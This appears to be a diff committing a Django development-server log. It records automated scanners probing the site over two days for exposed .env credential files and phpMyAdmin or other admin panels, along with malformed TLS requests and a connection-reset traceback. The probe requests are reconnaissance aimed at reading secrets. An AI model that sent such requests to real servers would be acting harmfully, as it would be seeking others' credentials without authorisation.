+[19/Dec/2021 05:52:40] code 400, message Bad request version ('À\x14À')
+[19/Dec/2021 05:52:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /admin/.env
+[19/Dec/2021 11:36:17] "GET /admin/.env HTTP/1.0" 404 3845
+Not Found: /api/.env
+[19/Dec/2021 11:36:39] "GET /api/.env HTTP/1.0" 404 23
+[19/Dec/2021 13:19:21] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
+[19/Dec/2021 13:19:21] "Z¥     " 400 -
+[19/Dec/2021 13:24:43] code 400, message Bad request syntax ('\x01\x01æ')
+[19/Dec/2021 13:24:43] "æ" 400 -
+Not Found: /
+[19/Dec/2021 14:05:07] "GET / HTTP/1.1" 404 2219
+Not Found: /
+[19/Dec/2021 20:21:29] "GET / HTTP/1.1" 404 2224
+Not Found: /admin/phpmyadmin/index.php
+[19/Dec/2021 23:34:50] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.0" 404 3901
+Not Found: /admin/web/index.php
+[19/Dec/2021 23:34:54] "GET /admin/web/index.php?lang=en HTTP/1.0" 404 3880
+Not Found: /admin/phpmyadmin/index.php
+[19/Dec/2021 23:35:10] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.0" 404 3901
+Not Found: /admin/sysadmin/index.php
+[19/Dec/2021 23:35:13] "GET /admin/sysadmin/index.php?lang=en HTTP/1.0" 404 3895
+Not Found: /admin/index.php
+[19/Dec/2021 23:35:14] "GET /admin/index.php?lang=en HTTP/1.0" 404 3868
+Not Found: /admin/sqladmin/index.php
+[19/Dec/2021 23:35:20] "GET /admin/sqladmin/index.php?lang=en HTTP/1.0" 404 3895
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.196', 41076)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/home/ec2-user/django/myprojectenv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 159, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[20/Dec/2021 00:38:21] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[20/Dec/2021 00:38:21] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[20/Dec/2021 03:21:56] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[20/Dec/2021 05:47:04] "GET / HTTP/1.1" 404 2219
+[20/Dec/2021 05:58:59] code 400, message Bad request version ('À\x14À')
+[20/Dec/2021 05:58:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /admin/.env
+[20/Dec/2021 06:58:12] "GET /admin/.env HTTP/1.0" 404 3845
+Not Found: /api/.env
+[20/Dec/2021 06:58:12] "GET /api/.env HTTP/1.0" 404 23
+Not Found: /admin/.env
+[20/Dec/2021 06:58:13] "POST /admin/.env HTTP/1.0" 404 3846
+Not Found: /api/.env
+[20/Dec/2021 06:58:13] "POST /api/.env HTTP/1.0" 404 23
+Not Found: /
+[20/Dec/2021 07:00:24] "GET / HTTP/1.1" 404 2224
+Invalid HTTP_HOST header: 'f2bc1e8dc5.xalrk.com'. You may need to add 'f2bc1e8dc5.xalrk.com' to ALLOWED_HOSTS.
+[20/Dec/2021 08:01:08] "GET /api/version/getVersionByType HTTP/1.0" 400 62068
